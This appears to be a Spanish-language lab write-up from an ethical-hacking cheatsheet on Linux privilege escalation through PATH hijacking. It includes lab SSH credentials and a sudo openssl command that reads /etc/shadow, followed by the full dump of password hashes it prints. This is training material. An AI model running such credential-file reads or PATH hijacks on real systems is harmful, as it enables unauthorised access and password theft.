
# Abuso de PATH

[PATH](http://www.linfo.org/path_env_var.html) es una variable de entorno que especifica el conjunto de directorios donde se puede ubicar un ejecutable. La variable PATH de una cuenta es un conjunto de rutas absolutas, lo que permite a un usuario escribir un comando sin especificar la ruta absoluta al binario. Por ejemplo, un usuario puede escribir `cat /tmp/test.txt` en lugar de especificar la ruta absoluta `/bin/cat /tmp/test.txt`. Podemos comprobar el contenido de la variable PATH escribiendo `env | grep PATH` o `echo $PATH`.

```shell-session
htb_student@NIX02:~$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

La creación de un script o programa en un directorio especificado en PATH hará que sea ejecutable desde cualquier directorio del sistema.

```shell-session
htb_student@NIX02:~$ pwd && conncheck 

/usr/local/sbin
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       
tcp        0     88 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p
tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       
tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2    
```

Como se muestra a continuación, el script `conncheck` creado en `/usr/local/sbin` aún se ejecutará cuando esté en el directorio `/tmp` porque se creó en un directorio especificado en PATH.

```shell-session
htb_student@NIX02:~$ pwd && conncheck 

/tmp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       
tcp        0    268 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p
tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       
tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2     
```

Al agregar `.` al PATH de un usuario, se agrega su directorio de trabajo actual a la lista. Por ejemplo, si podemos modificar la ruta de un usuario, podríamos reemplazar un binario común como `ls` por un script malicioso como un shell inverso. Si agregamos `.` a la ruta emitiendo el comando `PATH=.:$PATH` y luego `export PATH`, podremos ejecutar binarios ubicados en nuestro directorio de trabajo actual con solo escribir el nombre del archivo (es decir, con solo escribir `ls` se llamará al script malicioso nombrado `ls` en el directorio de trabajo actual en lugar del binario ubicado en `/bin/ls`).

```shell-session
htb_student@NIX02:~$ echo $PATH

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

```shell-session
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

En este ejemplo, modificamos la ruta para ejecutar un comando `echo` simple cuando se escribe el comando `ls`.

```shell-session
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls
```

```shell-session
htb_student@NIX02:~$ ls

PATH ABUSE!!
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.2.210 (ACADEMY-LPE-NIX02)
User "htb-student"
Password "Academy_LLPE!"
```

Revise el PATH del usuario htb-student. ¿Qué directorio no predeterminado forma parte del PATH del usuario?

```shell-session
htb-student@NIX02:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/tmp
```

Revisando el PATH observamos que el directorio `/tmp` forma parte de PATH, con lo que la creación de un script o programa en este directorio `/tmp` hará que sea ejecutable desde cualquier directorio del sistema.

Comprobando los privilegios de ejecución encontramos que el usuario htb-student puede ejecutar `openssl` como root:

```shell-session
htb-student@NIX02:/tmp$ sudo -l
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
```

1\. Como el usuario tiene permiso para ejecutar `/usr/bin/openssl` como root, podemos aprovecharlo para ejecutar una shell de root.

2\. Ejecutamos el siguiente comando para leer el archivo shadow:

```bash
sudo /usr/bin/openssl enc -in /etc/shadow
```

```bash
htb-student@NIX02:/$ sudo /usr/bin/openssl enc -in /etc/shadow
root:$6$WanLJSRD$y.zGt2OxMWkO9K/aNaLzh48ugtuVFjMJp9AT8Q3CxEJNjGaGTarLU5Vs1aZIOGv.jyehUWE5Ue.rz/kYnxDQ2.:19744:0:99999:7:::
daemon:*:17590:0:99999:7:::
bin:*:17590:0:99999:7:::
sys:*:17590:0:99999:7:::
sync:*:17590:0:99999:7:::
games:*:17590:0:99999:7:::
man:*:17590:0:99999:7:::
lp:*:17590:0:99999:7:::
mail:*:17590:0:99999:7:::
news:*:17590:0:99999:7:::
uucp:*:17590:0:99999:7:::
proxy:*:17590:0:99999:7:::
www-data:*:17590:0:99999:7:::
backup:*:17590:0:99999:7:::
list:*:17590:0:99999:7:::
irc:*:17590:0:99999:7:::
gnats:*:17590:0:99999:7:::
nobody:*:17590:0:99999:7:::
systemd-timesync:*:17590:0:99999:7:::
systemd-network:*:17590:0:99999:7:::
systemd-resolve:*:17590:0:99999:7:::
syslog:*:17590:0:99999:7:::
_apt:*:17590:0:99999:7:::
lxd:*:18504:0:99999:7:::
messagebus:*:18504:0:99999:7:::
uuidd:*:18504:0:99999:7:::
dnsmasq:*:18504:0:99999:7:::
sshd:*:18504:0:99999:7:::
mrb3n:$6$l.zGxurE$2GZ4wOHY8aRBr3RJ7T2yR68FJw7X2Fr4H/gjSc66Ccq3i2vSoNavHJKjsbqPCVsIRVWoRt/H6x450bWUUbejx0:18507:0:99999:7:::
colord:*:18504:0:99999:7:::
backupsvc:!:18504:0:99999:7:::
bob.jones:!:18504:0:99999:7:::
cliff.moore:!:18504:0:99999:7:::
logger:!:18504:0:99999:7:::
shared:!:18504:0:99999:7:::
stacey.jenkins:$6$pGJjlHOW$IBukckSzA228hJq/fEcOosOoa8n/7HlPgG7ztZsDaFOr1POEpyZZ9WnMeGb2thWlOLyjHRP.5BvWnFl6saM/D0:18504:0:99999:7:::
sysadm:!:18504:0:99999:7:::
htb-student:$6$6Zfc.iqc$GvNBXvzPRklYd3Zkfni8W8D9o8mod6dXtcGmWPlc/x5CPhV1R8NegwFxKi98xicj90J.BiTgut/dqI9sZNYOA.:18504:0:99999:7:::
mysql:!:18506:0:99999:7:::
devops:$6$Ev2lxTus$wHEMZPqgDcn2lXGa4x7gU.9g9jVbBjQydS9oGZP6Zik7LmIjsP0pdqDFaN76k9K4bArd8uP3R3w7s8g.Dr5Q5/:18506:0:99999:7:::
secaudit:$6$hCambemY$lasuPXSw2Hx0QdjhZQQC8ZeVNVXFAfTTKmMu0hmucaICjRUuWjqdrV3ig8WmsbKtEtgI6Y/Z1dMWplS.uq/pJ/:18506:0:99999:7:::
statd:*:18507:0:99999:7:::
daniel.carter:$6$GSVhlVa9$azlWJS.OAjy62UilpkSiCt/5EP/Y95tKd.CQAeMF/Qj5OKrZdrgPQJ7IvPBGv.kjBfQ2fpFxplwm6NPo2L3HA.:18509:0:99999:7:::
saned:*:19744:0:99999:7:::
```

Obtenemos las contraseñas de todos los usuarios del sistema, que podríamos crackear fácilmente con John:

{% content-ref url="/pages/TRZKCtXVALGrKxJ5dmfE" %}
[Cracking de Contraseñas](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/cracking-de-contrasenas.md)
{% endcontent-ref %}

De igual manera también podríamos usar las técnicas de GTFOBins para openssl:

{% embed url="<https://gtfobins.github.io/gtfobins/openssl/>" %}
